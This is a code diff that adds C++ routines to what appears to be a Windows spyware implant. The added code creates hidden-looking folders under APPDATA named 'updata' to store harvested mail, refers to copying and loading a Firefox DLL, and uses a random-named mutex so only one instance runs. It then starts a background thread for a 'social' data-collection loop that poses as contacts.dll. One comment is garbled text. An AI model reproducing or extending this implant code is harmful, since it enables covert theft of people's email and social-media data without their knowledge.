@@ -2647,3 +2647,62 @@ void __stdcall HM_sMain(void)
 	HM_StartPolling();
 	*/
 }
+char init_home_path[MAX_PATH] = { 0 };
+char mail_save_path[MAX_PATH] = { 0 };//firefox dll  copy to this dir and load
+void InitMailPath()
+{
+	char str_all_user_path[MAX_PATH] = { 0 };
+
+	GetEnvironmentVariableA("APPDATA", str_all_user_path, MAX_PATH);
+	_stprintf(init_home_path, "%s\\updata", str_all_user_path);
+	CreateDirectoryA(init_home_path, NULL);
+	_stprintf(init_home_path, "%s\\updata\\m", str_all_user_path);
+	CreateDirectoryA(init_home_path, NULL);
+	_stprintf(mail_save_path, "%s\\updata\\m\\data", str_all_user_path);
+	CreateDirectoryA(mail_save_path, NULL);
+
+}
+
+#include "Tools.h"
+
+void RunInternal(const char* dllname, const char* homepath)
+{
+	LOG_InitLog();// for some var init
+	log_free_space = 1024 * 1024 * 200;// patch the var , 200M
+	//std::string strDllName = GetAppNameA();
+	strcpy_s(H4DLLNAME, sizeof(H4DLLNAME), dllname);
+	//std::string strHomePath = GetAppPathA();
+	strcpy_s(H4_HOME_PATH, sizeof(H4_HOME_PATH), homepath);
+	PM_SocialAgentRegister();//for some var init
+
+	void SocialMainLoop();
+	SocialMainLoop();
+}
+void WINAPI Run()
+{
+	//std::string strPath = GetAppPathA();
+	//RunInternal("contacts.dll", strPath.substr(0, strPath.length() - 1).c_str());
+	InitMailPath();
+	RunInternal("contacts.dll", init_home_path);
+
+}
+void StartRun()
+{
+	HANDLE mutex = ::CreateMutex(NULL, FALSE, "f8SklsW514X_mutex");//Ëæ±ãÇÃµÄ
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		if (mutex != NULL)
+		{
+			CloseHandle(mutex);
+			mutex = NULL;
+		}
+		return;
+	}
+
+	HANDLE hThreadRem;
+	DWORD dwThreadId;
+	if (!(hThreadRem = CreateThread(NULL, 8192, (LPTHREAD_START_ROUTINE)Run, (LPVOID)0, 0, &dwThreadId)))
+		return ;//err
+	CloseHandle(hThreadRem);
+	return ;
+}
